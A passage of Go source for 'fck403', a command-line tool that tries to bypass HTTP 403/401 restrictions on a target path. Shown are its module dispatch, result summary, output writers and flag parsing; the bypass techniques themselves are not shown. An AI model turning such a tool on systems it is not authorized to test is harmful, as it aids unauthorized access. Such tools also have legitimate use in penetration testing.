		"paths":    s.runPaths,
		"headers":  s.runHeaders,
		"rewrite":  s.runRewrite,
		"ua":       s.runUA,
		"referer":  s.runReferer,
		"host":     s.runHost,
		"hopbyhop": s.runHopByHop,
		"protocol": s.runProtocol,
		"port":     s.runPort,
		"misc":     s.runMisc,
	}

	for _, name := range moduleNames {
		if s.cfg.Modules[name] {
			dispatch[name]()
		}
	}

	s.printSummary(time.Since(start))
}

func (s *Scanner) printSummary(elapsed time.Duration) {
	fmt.Printf("\n%s%s  RESULTS%s\n", Bold, White, Reset)
	fmt.Printf("%s  ──────────────────────────────────────────────────────────%s\n", Gray, Reset)

	total := len(s.results)
	var bypassed, redirects, blocked, falsepos, errors int
	var bypasses []Result
	var fps []Result

	for _, r := range s.results {
		if r.Category == "BASELINE" {
			continue
		}
		switch {
		case s.isLikelyBypass(r):
			bypassed++
			bypasses = append(bypasses, r)
		case r.StatusCode >= 300 && r.StatusCode < 400:
			redirects++
		case r.StatusCode == 403 || r.StatusCode == 401:
			blocked++
		case r.StatusCode >= 200 && r.StatusCode < 300:
			// 200 but matches baseline or notfound -> false positive
			falsepos++
			fps = append(fps, r)
		default:
			errors++
		}
	}

	fmt.Printf("  Total:       %s%d%s\n", Bold, total-1, Reset) // exclude baseline from count
	fmt.Printf("  %sBypassed:    %d%s\n", Green, bypassed, Reset)
	fmt.Printf("  %sRedirects:   %d%s\n", Yellow, redirects, Reset)
	fmt.Printf("  %sBlocked:     %d%s\n", Red, blocked, Reset)
	if falsepos > 0 {
		fmt.Printf("  %sFalse pos:   %d%s %s(matched baseline/404/root)%s\n", Gray, falsepos, Reset, Gray, Reset)
	}
	fmt.Printf("  %sErrors:      %d%s\n", Gray, errors, Reset)

	if len(bypasses) > 0 {
		fmt.Printf("\n  %s%sSMASHED THROUGH:%s\n", BGreen, Bold, Reset)
		fmt.Printf("%s  ──────────────────────────────────────────────────────────%s\n", Gray, Reset)
		for _, r := range bypasses {
			fmt.Printf("  %s[%d]  %6d B  %-16s %s%s\n", Green, r.StatusCode, r.Size, r.Category, r.Technique, Reset)
		}
	} else {
		fmt.Printf("\n  %sNo bypasses found. Wall held strong.%s\n", Red, Reset)
	}

	if redirects > 0 {
		fmt.Printf("\n  %s%sREDIRECTS (worth checking):%s\n", Yellow, Bold, Reset)
		for _, r := range s.results {
			if r.StatusCode >= 300 && r.StatusCode < 400 {
				fmt.Printf("  %s[%d]  %6d B  %-16s %s%s\n", Yellow, r.StatusCode, r.Size, r.Category, r.Technique, Reset)
			}
		}
	}

	if len(fps) > 0 && s.cfg.Verbose {
		fmt.Printf("\n  %sFALSE POSITIVES (same as baseline/404/root):%s\n", Gray, Reset)
		for _, r := range fps {
			fmt.Printf("  %s[%d]  %6d B  %-16s %s%s\n", Gray, r.StatusCode, r.Size, r.Category, r.Technique, Reset)
		}
	}

	if s.cfg.Output == "json" {
		f := fmt.Sprintf("/tmp/fck403_%d.json", time.Now().Unix())
		data, err := json.MarshalIndent(s.results, "", "  ")
		if err != nil {
			fmt.Printf("\n  %sJSON marshal error: %v%s\n", Red, err, Reset)
		} else if err := os.WriteFile(f, data, 0644); err != nil {
			fmt.Printf("\n  %sJSON write error: %v%s\n", Red, err, Reset)
		} else {
			fmt.Printf("\n  %sJSON: %s%s\n", Cyan, f, Reset)
		}
	}
	if s.cfg.Output == "csv" {
		f := fmt.Sprintf("/tmp/fck403_%d.csv", time.Now().Unix())
		file, err := os.Create(f)
		if err != nil {
			fmt.Printf("\n  %sCSV write error: %v%s\n", Red, err, Reset)
		} else {
			fmt.Fprintln(file, "category,technique,status_code,size,time")
			for _, r := range s.results {
				fmt.Fprintf(file, "\"%s\",\"%s\",%d,%d,%.2f\n", r.Category, r.Technique, r.StatusCode, r.Size, r.Time)
			}
			file.Close()
			fmt.Printf("\n  %sCSV: %s%s\n", Cyan, f, Reset)
		}
	}

	fmt.Printf("\n  %sDone in %.1fs%s\n\n", Gray, elapsed.Seconds(), Reset)
}

// ── MAIN ─────────────────────────────────────────────────────────────────────

func main() {
	var (
		url             string
		path            string
		threads         int
		timeout         int
		delay           int
		output          string
		proxy           string
		cookie          string
		header          string
		successOnly     bool
		verbose         bool
		followRedirects bool
		modules         string
		list            bool
	)

	flag.StringVar(&url, "u", "", "Target URL")
	flag.StringVar(&path, "p", "", "Target path")
	flag.IntVar(&threads, "t", 10, "Threads")
	flag.IntVar(&timeout, "T", 10, "Timeout (seconds)")
	flag.StringVar(&output, "o", "text", "Output: text/json/csv")
	flag.StringVar(&proxy, "x", "", "Proxy URL")
	flag.StringVar(&cookie, "c", "", "Cookie")
	flag.StringVar(&header, "H", "", "Custom header")
	flag.BoolVar(&successOnly, "s", false, "Show only bypasses")
	flag.BoolVar(&verbose, "v", false, "Verbose")
	flag.IntVar(&delay, "d", 0, "Delay between requests (ms)")
	flag.BoolVar(&followRedirects, "L", false, "Follow redirects")
	flag.StringVar(&modules, "m", "all", "Modules: all or comma-separated (methods,paths,headers,rewrite,ua,referer,host,hopbyhop,protocol,port,misc)")
	flag.BoolVar(&list, "list", false, "List available modules")

	flag.Usage = func() {
		banner()
		fmt.Printf("%sUsage:%s\n", Bold, Reset)
		fmt.Println("  fck403 <url> <path> [flags]")
		fmt.Println("  fck403 -u <url> -p <path> [flags]")
		fmt.Printf("\n%sExamples:%s\n", Bold, Reset)
		fmt.Println("  fck403 https://target.com admin")
		fmt.Println("  fck403 https://target.com admin -m methods,paths")
		fmt.Println("  fck403 -u https://target.com -p admin -t 20 -o json")
		fmt.Println("  fck403 -u https://target.com -p admin -m headers -s")
		fmt.Println("  fck403 --list")
		fmt.Printf("\n%sFlags:%s\n", Bold, Reset)
		flag.PrintDefaults()
		fmt.Println()
	}

	if len(os.Args) >= 3 && !strings.HasPrefix(os.Args[1], "-") {
		url = os.Args[1]
		path = os.Args[2]
		os.Args = append(os.Args[:1], os.Args[3:]...)
	}

	flag.Parse()

	if list {
		listModules()
		os.Exit(0)
	}

	if url == "" || path == "" {
		flag.Usage()
		os.Exit(1)
	}

	url = strings.TrimRight(url, "/")
	path = strings.TrimLeft(path, "/")

	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
		fmt.Printf("%sURL must start with http:// or https://%s\n", Red, Reset)
		os.Exit(1)
	}
	if threads <= 0 {
		fmt.Printf("%sThreads must be greater than 0%s\n", Red, Reset)
		os.Exit(1)
	}
	if timeout <= 0 {
		fmt.Printf("%sTimeout must be greater than 0%s\n", Red, Reset)
		os.Exit(1)
	}

	mods := make(map[string]bool)
	if modules == "all" {
		for _, n := range moduleNames {
			mods[n] = true
		}
	} else {
		for _, m := range strings.Split(modules, ",") {
			m = strings.TrimSpace(m)
			valid := false
			for _, n := range moduleNames {
				if m == n {
					valid = true
					break
				}
			}
			if valid {
				mods[m] = true
			} else {
				fmt.Printf("%sUnknown module: %s (use --list to see available)%s\n", Red, m, Reset)
				os.Exit(1)
			}
		}
	}

	cfg := Config{
		URL: url, Path: path, Threads: threads, Timeout: timeout,
		Delay: delay, Output: output, Proxy: proxy, Cookie: cookie, Header: header,
		SuccessOnly: successOnly, Verbose: verbose, FollowRedirects: followRedirects,
		Modules: mods,
	}

	NewScanner(cfg).Run()
}
